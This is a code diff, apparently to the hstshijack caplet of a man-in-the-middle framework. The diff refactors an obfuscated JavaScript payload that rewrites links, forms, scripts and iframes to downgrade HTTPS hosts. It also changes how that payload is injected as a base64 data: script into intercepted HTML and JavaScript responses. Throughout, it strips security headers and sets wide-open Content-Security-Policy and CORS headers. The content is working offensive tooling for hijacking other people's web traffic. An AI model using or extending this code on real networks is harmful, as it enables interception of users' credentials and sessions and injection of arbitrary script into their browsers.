@@ -6,8 +6,8 @@ var ssl_log = [],
 
 var payload,
     payload_container = new String(
-    	"if (!self.{{session_id}}) {\n" + 
-    	"	self.{{session_id}} = function() {\n" + 
+    	"if (!self.{{SESSION_ID_TAG}}) {\n" + 
+    	"	self.{{SESSION_ID_TAG}} = function() {\n" + 
     	"		var obf_var_callback_log_121737 = [];\n" + 
     	"		function obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
     	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
@@ -44,7 +44,7 @@ var payload,
     	"				return obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)\n" + 
     	"			}\n" + 
     	"		}\n" + 
-    	"		{{variables}}\n" + 
+    	"		{{VARIABLES_TAG}}\n" + 
     	"		function obf_func_hstshijack_121737(obf_host_121737) {\n" + 
     	"			for (obf_var_i_121737 = 0; obf_var_i_121737 < obf_var_target_hosts.length; obf_var_i_121737++) {\n" + 
     	"				obf_var_whole_regexp_set_121737 = obf_func_toWholeRegexpSet_121737(obf_var_target_hosts[obf_var_i_121737], obf_var_replacement_hosts[obf_var_i_121737]);\n" + 
@@ -80,7 +80,7 @@ var payload,
     	"						obf_var_callback_log_121737.push(obf_var_host_121737);\n" + 
     	"					}\n" + 
     	"				}\n" + 
-    	"			} catch(obf_ignore_121737){}\n" + 
+    	"			} catch(obf_var_ignore_121737){}\n" + 
     	"			try {\n" + 
     	"				document.querySelectorAll(\"a,form,script,iframe\").forEach(function(obf_var_node_121737){\n" + 
     	"					obf_var_url_121737 = \"\";\n" + 
@@ -101,7 +101,7 @@ var payload,
     	"						}\n" + 
     	"					}\n" + 
     	"				});\n" + 
-    	"			} catch(obf_ignore_121737){}\n" + 
+    	"			} catch(obf_var_ignore_121737){}\n" + 
     	"		}\n" + 
     	"		setInterval(function(){\n" + 
     	"			obf_func_attack_121737();\n" + 
@@ -110,14 +110,14 @@ var payload,
     	"		try {\n" + 
     	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_121737);\n" + 
     	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_XMLHttpRequest_121737);\n" + 
-    	"		} catch(obf_ignore_121737){\n" + 
+    	"		} catch(obf_var_ignore_121737){\n" + 
     	"			self.addEventListener(\"load\", obf_func_attack_121737);\n" + 
     	"			self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest_121737);\n" + 
     	"		}\n" + 
     	"		obf_func_attack_121737();\n" + 
-    	"		{{custom_payload}}\n" + 
+    	"		{{CUSTOM_PAYLOAD_TAG}}\n" + 
     	"	}\n" + 
-    	"	self.{{session_id}}();\n" + 
+    	"	self.{{SESSION_ID_TAG}}();\n" + 
     	"}\n")
 
 var ignore_hosts       = [],
@@ -126,8 +126,7 @@ var ignore_hosts       = [],
     block_script_hosts = [],
     payloads
 
-var obfuscate,
-    encode
+var obfuscate
 
 var callback_path,
     whitelist_path,
@@ -255,7 +254,6 @@ function configure() {
 	env["hstshijack.blockscripts"] ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",") : block_script_hosts = []
 	env["hstshijack.payloads"]     ? payloads           = env["hstshijack.payloads"].replace(/\s/g, "").split(",")     : payloads           = []
 	env["hstshijack.obfuscate"]    ? obfuscate          = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase() : obfuscate          = false
-	env["hstshijack.encode"]       ? encode             = env["hstshijack.encode"].replace(/\s/g, "").toLowerCase()    : encode             = false
 
 	// Validate caplet.
 	target_hosts.length < replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").")   : ""
@@ -298,11 +296,6 @@ function configure() {
 	} else {
 		obfuscate = false
 	}
-	if (encode == "true") {
-		encode = true
-	} else {
-		encode = false
-	}
 	// Preload custom payloads.
 	p = {}
 	for (var a = 0; a < payloads.length; a++) {
@@ -328,24 +321,21 @@ function configure() {
 				}
 			}
 
-			// Escape dollar signs for regexp replacement
 			if (p[payload_host]) {
-				p[payload_host] = { "payload": p[payload_host].payload + "\n" + this_payload.replace(/\$/g, "{{hstshijack_dollar_sign}}") }
+				p[payload_host] = { "payload": p[payload_host].payload + "\n" + this_payload }
 			} else {
-				p[payload_host] = { "payload": this_payload.replace(/\$/g, "{{hstshijack_dollar_sign}}") }
+				p[payload_host] = { "payload": this_payload }
 			}
 		}
 	}
 	payloads = p
 	// Prepare core payload.
-	payload = payload_container.replace(/\$/g, "{{hstshijack_dollar_sign}}")
-	payload = payload.replace("{{payload}}", payload)
-	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
+	payload = payload_container.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id)
 	payload = payload.replace("obf_path_whitelist", whitelist_path)
 	payload = payload.replace("obf_path_callback", callback_path)
 	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
-	payload = payload.replace( "{{variables}}", "{{variables}}\n		var " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]" )
-	payload = payload.replace( "{{variables}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
+	payload = payload.replace( "{{VARIABLES_TAG}}", "{{VARIABLES_TAG}}\n		var " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]" )
+	payload = payload.replace( "{{VARIABLES_TAG}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
 	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
 	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
 	// Obfuscate core payload.
@@ -385,7 +375,6 @@ function showConfig() {
 	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "     hstshijack.obfuscate" + reset + " > " + ( obfuscate ? green + "true" : red + "false" ) + reset + "\n"
-	logStr += "    " + yellow + "        hstshijack.encode" + reset + " > " + ( encode ? green + "true" : red + "false" ) + reset + "\n"
 	logStr += "    " + yellow + "      hstshijack.payloads" + reset + " > "
 	if ( env["hstshijack.payloads"] ) {
 			list = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
@@ -769,36 +758,39 @@ function onResponse(req, res) {
 		}
 
 		// Inject payloads.
-		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head[^>]*?>/i) ) {
-			injection = payload
+		injection = payload
+		injecting = false
 
-			for ( var a = 0; a < Object.keys(payloads).length; a++ ) {
-				host = Object.keys(payloads)[a]
-				var whole_regexp_set
-				if ( !host.match(/^\*$/) ) {
-					whole_regexp_set = toWholeRegexpSet(host, "")
-				}
-				if ( host.match(/^\*$/) || req.Hostname.match(whole_regexp_set[0]) ) {
-					injection = injection.replace("{{custom_payload}}", payloads[host].payload + "\n{{custom_payload}}")
-					log_debug(on_blue + "hstshijack" + reset + " Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
-				}
+		// Assemble payload.
+		for ( var a = 0; a < Object.keys(payloads).length; a++ ) {
+			host = Object.keys(payloads)[a]
+			if ( host.match(/^\*$/) || req.Hostname.match( toWholeRegexpSet(host, "")[0] ) ) {
+				injecting = true
+				injection = injection.replace("{{CUSTOM_PAYLOAD_TAG}}", payloads[host].payload.replace(/\$/g, "$$$$") + "\n{{CUSTOM_PAYLOAD_TAG}}")
+				log_debug(on_blue + "hstshijack" + reset + " Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
 			}
+		}
 
-			injection = injection.replace("{{custom_payload}}", "")
-			// Escape "$" with $$"
-			// This must be done because "$" symbols in payloads are otherwise interpreted as regexp substitutions
-			injection = injection.replace(/\{\{hstshijack_dollar_sign\}\}/g, "$$$$")
-
+		if (injecting) {
+			injection = injection.replace("{{CUSTOM_PAYLOAD_TAG}}", "")
+			// Inject JavaScript documents.
 			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
-				res.Body = injection.replace(/.*/g, injection) + res.Body
+				res.Body = injection + res.Body
 				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
-			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
-				if (encode) {
-					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
-				} else {
-					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script>\n" + injection + "</script>")
+			} else {
+				// Limit body scanning buffer.
+				res_inject_buffer = res.Body.substr(0, 1000)
+				res_injected_buffer = ""
+				// Inject HTML documents.
+				if (res_inject_buffer.length != 0) {
+					if ( res_inject_buffer.match(/<head(?: [^>]*?|)>/i) ) {
+						payload_marker = randomString(16)
+						res_injected_buffer = res_inject_buffer.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + payload_marker + "\"></script>")
+						res_injected_buffer = res_injected_buffer.replace( payload_marker, btoa(injection) )
+						res.Body = res.Body.replace(res_inject_buffer, res_injected_buffer)
+						log_debug(on_blue + "hstshijack" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
+					}
 				}
-				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
 			}
 		}
 
@@ -835,9 +827,9 @@ function onResponse(req, res) {
 		res.RemoveHeader("Expect-Ct")
 
 		// Set insecure headers.
-		res.SetHeader("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
-		res.SetHeader("X-WebKit-CSP", "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
-		res.SetHeader("X-Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; script-src data: * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
+		res.SetHeader("Content-Security-Policy", "default-src * data: 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
+		res.SetHeader("X-WebKit-CSP", "default-src * data: 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
+		res.SetHeader("X-Content-Security-Policy", "default-src * data: 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
 		res.SetHeader("Access-Control-Allow-Origin", "*")
 		res.SetHeader("Access-Control-Allow-Methods", "*")
 		res.SetHeader("Access-Control-Allow-Headers", "*")
